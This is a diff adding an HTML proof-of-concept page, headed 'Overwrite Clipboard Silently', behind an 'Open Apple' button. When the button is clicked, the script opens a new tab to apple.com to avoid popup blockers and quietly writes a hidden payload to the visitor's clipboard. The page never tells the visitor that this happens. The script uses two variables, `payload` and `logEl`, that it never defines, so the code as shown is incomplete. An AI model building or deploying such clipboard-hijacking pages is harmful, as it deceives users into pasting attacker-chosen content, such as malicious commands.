@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>POC — Copy to Clipboard</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;margin:24px;background:#f6f7fb;color:#111}
+    .card{background:#fff;padding:18px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,0.06);max-width:820px}
+    button{padding:10px 14px;border-radius:8px;border:0;background:#0b84ff;color:#fff;cursor:pointer}
+    pre{background:#0f1720;color:#e6eef6;padding:12px;border-radius:8px;overflow:auto}
+    .warn{background:#fff3cd;border:1px solid #ffecb5;padding:10px;border-radius:8px;color:#664d03;margin-bottom:12px}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Overwrite Clipboard Silently</h2>
+    <p>
+      Click the button below — It will open apple.com in a new tab immediately.
+    </p>
+
+    <p>
+      <button id="btn">Open Apple</button>
+    </p>
+  </div>
+
+<script>
+
+  function log(msg){
+    const t = new Date().toISOString();
+    logEl.textContent += `\n[${t}] ${msg}`;
+    console.log('[POC]', msg);
+  }
+
+  btn.addEventListener('click', (ev) => {
+    // 1) Open the new window synchronously to avoid popup blockers
+    // Use about:blank so we can navigate later (some browsers prefer this)
+    const newWin = window.open('about:blank', '_blank', 'noopener');
+
+    if (!newWin) {
+      log('Popup blocked => window.open returned null. Cannot proceed reliably.');
+      alert('Popup blocked. Allow popups for this test and try again.');
+      return;
+    }
+    log('New window opened synchronously (about:blank).');
+
+    // 2) Attempt clipboard write (must be called under user gesture in many browsers)
+    // Note: navigator.clipboard.writeText returns a Promise
+    if (!navigator.clipboard || !navigator.clipboard.writeText) {
+      log('Clipboard API not available in this environment. Aborting clipboard write.');
+      // show fallback content in new window
+      newWin.document.body.innerHTML = '<p>Clipboard API not available in this environment.</p>';
+      return;
+    }
+
+    // We do not await before opening the window (we already opened it). Now write the clipboard.
+    navigator.clipboard.writeText(payload).then(() => {
+      log('Clipboard write succeeded.');
+      // navigate new window to a demonstration URL (safe)
+      try {
+        newWin.location.href = 'https://apple.com';
+        log('New window navigated to https://apple.com');
+      } catch (e) {
+        // some browsers restrict navigation on certain contexts; show fallback message
+        newWin.document.body.innerHTML = '<p>Clipboard write succeeded. Please navigate to https://example.com manually.</p>';
+        log('Navigation attempt failed; wrote a fallback message into the new window.');
+      }
+    }).catch((err) => {
+      log('Clipboard write failed: ' + err);
+      // Keep the new window open and show error to user for debugging
+      try {
+        newWin.document.body.innerHTML = '<p>Clipboard write failed: ' + String(err) + '</p>';
+      } catch(e) {}
+    });
+  });
+</script>
+</body>
+</html>
